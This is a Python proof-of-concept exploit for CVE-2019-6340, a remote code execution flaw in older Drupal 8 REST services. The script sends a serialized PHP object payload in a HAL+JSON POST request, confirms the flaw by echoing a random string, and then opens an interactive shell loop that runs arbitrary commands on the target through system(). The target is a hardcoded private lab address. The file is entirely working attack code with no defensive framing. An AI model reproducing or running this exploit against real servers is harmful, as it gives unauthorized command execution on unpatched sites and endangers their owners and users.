#!/usr/bin/python3
# coding:utf-8
#CVE-2019-6340 Drupal <= 8.6.9 REST services RCE PoC
import requests
import string
import random

headers = {
    'User-Agent': "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0",
    'Connection': "close",
    'Content-Type': "application/hal+json",
    'Accept': "*/*",
    'Cache-Control': "no-cache"
}
def random_string(stringLength):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))

def check(url_dir,string_reve):
    payload = "{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:7:\\\"print_r\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"%srest/type/shortcut/default\"\r\n    }\r\n  }\r\n}" % (
    len(string_reve), string_reve, url_dir.split('node')[0])
    response = requests.post(url_dir, data=payload, headers=headers)
    if string_reve in response.text:
        return True
    else:
        return False
def exploit(url_dir,cmd):
    payload = "{\r\n  \"link\": [\r\n    {\r\n      \"value\": \"link\",\r\n      \"options\": \"O:24:\\\"GuzzleHttp\\\\Psr7\\\\FnStream\\\":2:{s:33:\\\"\\u0000GuzzleHttp\\\\Psr7\\\\FnStream\\u0000methods\\\";a:1:{s:5:\\\"close\\\";a:2:{i:0;O:23:\\\"GuzzleHttp\\\\HandlerStack\\\":3:{s:32:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000handler\\\";s:%s:\\\"%s\\\";s:30:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000stack\\\";a:1:{i:0;a:1:{i:0;s:6:\\\"system\\\";}}s:31:\\\"\\u0000GuzzleHttp\\\\HandlerStack\\u0000cached\\\";b:0;}i:1;s:7:\\\"resolve\\\";}}s:9:\\\"_fn_close\\\";a:2:{i:0;r:4;i:1;s:7:\\\"resolve\\\";}}\"\r\n    }\r\n  ],\r\n  \"_links\": {\r\n    \"type\": {\r\n      \"href\": \"%srest/type/shortcut/default\"\r\n    }\r\n  }\r\n}" % (len(cmd), cmd, url_dir.split('node')[0])
    response = requests.post(url_dir, data=payload, headers=headers)
    s = response.text.split("}")[1]
    print(s)

def verify(protol,ip,port):
    if port.strip():
        url_dir = protol + "://" + ip +":" +port + "/node/?_format=hal_json"
    else:
        url_dir = protol + "://" + ip + "/node/?_format=hal_json"
    stringLength = 50
    string_reve = random_string(stringLength)
    try:
        if check(url_dir,string_reve):
            print("----------------[+] Find Drupal CVE-2019-6340_RCE Vuln!ã€‚Iuput [exit] to out! [+]----------------")
            while 1:
                cmd = str(input("shell$: ")).strip()
                if cmd == "exit":
                    exit(1)
                else:
                    exploit(url_dir, cmd)
        else:
            print("[-] Not Drupal CVE-2019-6340 Vuln!")
            exit(0)
    except:
        return False
if __name__ == '__main__':
    ip = "192.168.43.90"
    verify("http",ip,"32769")




